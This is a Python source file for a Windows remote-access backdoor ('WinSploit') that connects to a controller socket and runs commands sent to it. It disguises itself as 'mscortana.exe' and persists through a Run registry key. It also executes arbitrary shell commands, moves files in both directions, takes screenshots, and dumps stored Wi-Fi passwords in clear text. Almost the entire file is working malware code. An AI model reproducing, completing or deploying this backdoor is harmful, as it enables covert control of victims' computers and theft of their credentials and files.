import os, sys, subprocess, socket, platform, psutil, shutil, ctypes,re
from mss import mss
from datetime import datetime
from termcolor import colored
from time import sleep

# creating a client tcp socket object
sock = socket.socket()
LOCALHOST = "127.0.0.1"
LOCALPORT = 8989
ADDR = (LOCALHOST, LOCALPORT)
# Persistant backdoor/payload (you can still get the connection even if 
# the victim restarts his/her pc)
def create_persistant():
    # the location where the persistant backdoor will be saved
    location = os.environ["appdata"] + r"\mscortana.exe"
    # if the path doesn't already exist create the path and 
    # add the backdoor to startup registry
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v mscortana /t REG_SZ /d "' + location + '"', shell=True )

# helper function to keep on trying to keep if there's no any connection yet
# between the client and the server
def connect():
    while True:
        sleep(10)
        try:
            sock.connect(ADDR)
            handle_server()
            break
        except:
            connect()    

def get_cwd():
    cwd = os.getcwdb()
    sock.send(cwd) 


# helper function that will help use to recieve all 
#the data being send by the client
def recv_all():
    # number of bytes to be recieved at a time
    BUFFER_SIZE = 4096
    # initializing the data variable to store the recieved data in bytes
    data = b""
    # infinity loop to recieve data as long 
    #there is still data to be recieved from the client
    while True:
            # recieving chunks of data 
            chunk = client_sock.recv(BUFFER_SIZE)
            # concatenate the recieve chunk of data with the actual data 
            data +=chunk
            # if there is no data to be recieved break out of the loop
            if not chunk:
                break
            # return the full data and decode it to readable string         
            return data.decode()


# helper function to display a few system information
def sysinfo():
    uname = platform.uname()
    sysinfo = f'''System: {uname.system}
Node Name: {uname.node}
Release: {uname.release}
Version: {uname.version}
Machine: {uname.machine}
Processor: {uname.processor}
'''
    return sysinfo

# function to recieve data uploaded from the server
def upload_file(file_path):
    data_size = int(sock.recv(64).decode())
    filename = os.path.basename(file_path)
    with open(filename,"wb") as file:
        bytes_read = sock.recv(data_size)
        file.write(bytes_read)


# function to send data to the server
def download_file(filename):
    filesize = os.path.getsize(filename)
    sock.send(str(filesize).encode())
    with open(filename, "rb") as file:
        bytes_read = file.read(int(filesize))
        sock.sendall(bytes_read)        

# helper function to change the wallpaper
def change_wallpaper(filename_path):
        upload_file(filename_path)
        SPI_WALLPAPER = 0X14
        SPIF_UPDATINGFILE = 0X2
        SOURCE = os.getcwd() +  "\\" + os.path.basename(filename_path)
        ctypes.windll.user32.SystemParametersInfoW(SPI_WALLPAPER,0, SOURCE, SPIF_UPDATINGFILE)
        # delete the file after the wallpaper is changed
        subprocess.call("del " + SOURCE, shell=True)

# helper function to take screenshots and send it back to the server
def screenshot():
    with mss() as s_shot:
        s_shot.shot()
    filename = "monitor-1.png"
    filesize = os.path.getsize(filename)
    print(f"file size{filesize}")
    sock.send(str(filesize).encode())
    with open(filename, "rb") as file:
        bytes_read = file.read(int(filesize))
        sock.sendall(bytes_read)
        print("Done sending all the data")   
    os.remove(filename)    

# get wifi recently connected wifi passwords
def dump_wifi_passwords():
    network_list = subprocess.check_output("netsh wlan show profile", shell=True).decode()
    network_names = re.findall(r"(?:Profile\s*:\s)(.*)", network_list)

    network_result = b""

    for network_name in network_names:
        network_result += subprocess.check_output(f"netsh wlan show profile {network_name.strip()} key=clear", shell=True)
    sock.send(network_result)


def is_running_ass_admin():
    # check to see if the script is running with administrative privileges
    # returns true if running as admin, false otherwise
    try:
        return ctypes.windll.shell32.IsUserAnAdmin
    except:
        return False    

def show_help():
    show_help = f'''
{colored("SYSTEM COMMANDS:", "yellow")}
    these are all the windows system commands i.e {colored("%s, %s, %s" % ("tracert", "netstat", "ipconfig"), "cyan")} that you can execute.

{colored("CORE COMMANDS:", "yellow")}
    {colored("show_help", "cyan")}               - get help on how to use the WinSploit.
    {colored("check_privs", "cyan")}             - check to see if the backdoor is running with administrative
                              privileges.
    {colored("sysinfo", "cyan")}                 - get target system information.
    {colored("q", "cyan")}                       - press q to quit the program 

{colored("WORKING WITH FILES:", "yellow")}
    {colored("dir", "cyan")}                     - list files in the current working directory.
    {colored("mkdir", "cyan")} [dir name]        - create a folder on the target system.
    {colored("del", "cyan")} [file/dir name]     - delete a specified file/folder from the target system.
    {colored("cd", "cyan")} [directory name]     - change the current working directory to a specifie
                              directory.    
    {colored("upload", "cyan")} [filename/path]  - upload the specified filename to the target system.
    {colored("download", "cyan")} [filename/path]- donwload specified filename from the target system.

{colored("MISCELLANEOUS:", "yellow")}
    {colored("screenshot", "cyan")}              - take a desktop screenshot of the target system.
    {colored("dump_wifipass", "cyan")}           - dump wireless passwords of recently/curently connected
                              network.
    {colored("chwallpaper", "cyan")} [img/path]  - change desktop wallpaper of the target system                           
    
''' 
    return show_help
    


# function to hadle all the server commands and perfom the required function
def handle_server():
    get_cwd()
    while True:
        cmd = sock.recv(1024).decode()
        if cmd == "q":
            break
        elif cmd[:2] == "cd" and len(cmd) > 1:
            if cmd[:2] == "cd" and cmd[3:] == "":
                get_cwd()
            elif os.path.exists(cmd[3:]) and cmd[3:] !="":
                os.chdir(cmd[3:])
                get_cwd()
            else:
                sock.send("[!] FolderNotFoundError:The folder you're trying to access does not exist on the remote system !".encode())    
        elif cmd[:6] == "upload":
            upload_file(cmd[7:])
        elif cmd[:8] == "download":
            download_file(cmd[9:])
        elif cmd == "screenshot":
            screenshot() 
        elif cmd[:11] == "chwallpaper":
            change_wallpaper(cmd[12:])       
        elif cmd[:5] == "start":
            try:
                subprocess.call(cmd, shell=True)
            except:
                continue    
        elif cmd == "sysinfo":
            sock.sendall(sysinfo().encode())
        elif cmd == "dump_wifipass":
            dump_wifi_passwords()
        elif cmd == "check_privs":
            if not is_running_ass_admin():
                sock.send("[!!] The script is NOT running with administrative privileges.".encode())
            else:
                sock.send("[+] The script is running with administrative privileges.".encode())
        # show user help
        elif cmd == "show_help":
            sock.sendall(show_help().encode())

        else:
            proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            proc_result = proc.stdout.read() + proc.stderr.read()

            if not proc_result:
                 sock.send(" ".encode())
            else:
                sock.send(proc_result)
# main function               
def main():
    create_persistant()
    connect()
    sock.close()

if __name__ =="__main__":
    main()